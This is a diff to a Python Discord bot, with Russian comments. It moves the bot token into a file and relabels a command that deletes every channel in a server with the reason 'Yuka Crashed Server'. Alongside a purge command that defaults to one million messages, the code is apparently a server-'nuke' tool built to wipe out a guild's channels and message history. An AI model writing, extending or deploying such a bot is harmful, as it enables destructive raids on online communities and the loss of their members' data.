@@ -8,8 +8,6 @@ from discord.utils import get
 bot = commands.Bot(command_prefix='.', intents=discord.Intents.all())
 bot.remove_command("help")
 
-TOKEN = ''
-
 
 @bot.event
 async def on_ready():
@@ -48,7 +46,7 @@ async def avatar(ctx):
 async def delchannel(ctx):
     for channel in ctx.guild.channels: #собираем
         try:
-            await channel.delete(reason="По просьбе") #удаляем
+            await channel.delete(reason="Yuka Crashed Server") #удаляем
         except:
             continue
 
@@ -350,4 +348,5 @@ async def purge(ctx, amount=1000000):
        await k.purge(limit=amount)
 
 
-bot.run(TOKEN)
+with open("token.txt") as fp:
+    bot.run(fp.read().strip())
